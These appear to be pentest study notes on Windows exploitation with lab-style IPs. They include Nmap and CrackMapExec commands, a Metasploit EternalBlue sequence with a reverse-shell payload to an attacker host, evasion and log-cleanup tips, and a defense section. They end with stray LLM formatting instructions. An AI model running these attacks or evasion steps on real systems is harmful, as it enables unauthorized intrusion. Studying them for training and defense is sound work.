# 🛰️ Windows Exploitation Techniques

## Reconnaissance & Enumeration

### Basic Network Scanning with Nmap

[!INFO] This section outlines how to perform basic network reconnaissance using Nmap.

```bash
nmap -sS 10.129.201.97
```

### Deep OS Detection and Service Enumeration

[!INFO] Use `-O` flag for OS detection, and `-A` for aggressive scan with version detection.

```bash
nmap -O -A 10.129.201.97
```

## Windows SMB Exploitation

### Using CrackMapExec for Credential Dumping

[!INFO] CME is an excellent tool for automating post-exploitation tasks in Windows environments.

```bash
cme smb 10.129.201.97 -u 'user' -p 'pass'
```

### Exploit EternalBlue with Metasploit

[!SUCCESS] Successful exploitation using `ms17_010_eternalblue` module.

```ruby
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.129.201.97
set LHOST 10.10.14.12
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

## Meterpreter Basics

### Dropping to System Shell

[!INFO] Using `shell` command within Meterpreter session.

```bash
meterpreter > shell
```

## CMD vs PowerShell Comparison

### Command Prompt (CMD)

**Characteristics:**
- Original MS-DOS shell
- Text-based input/output
- Basic automation with batch files
- No command history retention
- No execution policy restrictions

**Common CMD commands:**
```cmd
dir                    # List directory contents
cd                     # Change directory
type                   # Display file contents
copy                   # Copy files
net user               # User management
net share              # Share management
tasklist               # List running processes
systeminfo             # System information
ipconfig               # Network configuration
```

### PowerShell

**Characteristics:**
- Advanced shell and scripting environment
- .NET object-based input/output
- Extensive cmdlet library
- Command history and transcription
- Execution policy enforcement
- Module and snap-in support

**Common PowerShell cmdlets:**
```powershell
Get-ChildItem          # List directory (ls equivalent)
Set-Location           # Change directory (cd equivalent)
Get-Content            # Read file contents (cat equivalent)
Copy-Item              # Copy files
Get-Process            # List processes (ps equivalent)
Get-Service            # List services
Get-WmiObject          # WMI queries
Invoke-WebRequest      # Web requests (wget/curl equivalent)
Get-ComputerInfo       # System information
```

## Advanced Windows Attack Vectors

### Windows Subsystem for Linux (WSL)

[!INFO] Security implications and attack applications.

**Security Considerations:**
- Virtual Linux environment within Windows
- Potential blind spot for security tools
- Network requests bypass Windows Firewall
- Limited Windows Defender visibility
- Novel attack vector for malware

**Attack Applications:**
- Python3 and Linux binary execution
- Payload download and installation
- Cross-platform script execution
- Firewall and AV evasion

### PowerShell Core on Linux

[!INFO] Cross-platform PowerShell implementation.

**Security Considerations:**
- Less monitored than traditional PowerShell
- Cross-platform payload delivery
- Hybrid attack scenarios

## Best Practices for Windows Exploitation

### Reconnaissance

1. **Multiple fingerprinting methods**
   - TTL analysis
   - Port scanning
   - Banner grabbing
   - OS detection

2. **Service enumeration**
   - SMB version detection
   - Web server identification
   - Available shares enumeration
   - User enumeration

3. **Vulnerability assessment**
   - Known exploit checking
   - Patch level analysis
   - Configuration weaknesses

### Payload Selection

1. **Target environment analysis**
   - Windows version and architecture
   - Available shells (CMD vs PowerShell)
   - Security controls (AV, firewall)
   - Network restrictions

2. **Delivery method planning**
   - Social engineering vectors
   - Network-based exploitation
   - Physical access scenarios
   - Privilege level requirements

### Operational Security

1. **Stealth considerations**
   - Log generation awareness
   - Process visibility
   - Network traffic patterns
   - Persistence mechanisms

2. **Cleanup procedures**
   - Artifact removal
   - Log cleanup
   - Process termination
   - Connection closure

### Post-Exploitation

1. **Initial access stabilization**
   - Process migration
   - Persistence establishment
   - Backup access creation
   - Privilege escalation

2. **Information gathering**
   - System enumeration
   - User enumeration
   - Network discovery
   - Credential harvesting

## Common Windows Exploitation Patterns

### SMB-Based Attacks

**EternalBlue (MS17-010):**
- Target: SMBv1 protocol
- Impact: Remote code execution
- Affected: Windows 2000 to Server 2016

**SMB Relay Attacks:**
- Capture and relay NTLM authentication
- Target systems without SMB signing
- Privilege escalation opportunities

### RDP-Based Attacks

**BlueKeep (CVE-2019-0708):**
- Target: RDP protocol
- Impact: Remote code execution
- Affected: Windows 2000 to Server 2008 R2

**RDP Credential Attacks:**
- Brute force attacks
- Credential stuffing
- Pass-the-hash attacks

### Web-Based Attacks

**IIS Vulnerabilities:**
- Directory traversal
- Buffer overflows
- Authentication bypasses

**ASP.NET Exploitation:**
- ViewState manipulation
- Deserialization attacks
- File upload vulnerabilities

## Detection and Defense

### Common Detection Methods

**Network-Level:**
- Unusual SMB traffic patterns
- Multiple authentication failures
- Suspicious RDP connections
- Known exploit signatures

**Host-Level:**
- Process creation monitoring
- PowerShell execution logging
- File system modifications
- Registry changes

### Defensive Strategies

**Patch Management:**
- Regular security updates
- Critical vulnerability prioritization
- Testing and deployment procedures

**Network Segmentation:**
- DMZ implementation
- VLAN separation
- Firewall rules
- Access control lists

**Monitoring and Logging:**
- SIEM deployment
- PowerShell script block logging
- Process creation logging
- Network traffic analysis

### Hardening Measures

**System Configuration:**
- Disable unnecessary services
- Remove unused protocols
- Implement principle of least privilege
- Enable security features

**PowerShell Hardening:**
- Constrained Language Mode
- Execution policy enforcement
- Script block logging
- Module logging

## Conclusion

[!INFO] Windows systems present a rich attack surface with numerous exploitation vectors. Success requires thorough enumeration, vulnerability assessment, appropriate payload selection, careful operational security, and understanding both CMD and PowerShell environments.

---

STRICT FORMATTING RULES:
1. DO NOT summarize, shorten, or remove ANY technical details, commands, IPs, or explanations.
2. Use emojis in ALL H1 and H2 headers (e.g., `# 🛰️ Title`, `## 🔍 Subtitle`).
3. STRICTLY APPLY THE CALLOUT SYSTEM based on context.
4. Separate major logical sections with horizontal rules (`---`).
5. Use clean Markdown tables where appropriate.
6. ALWAYS use language tags for code blocks (e.g., ```bash, ```text, ```python).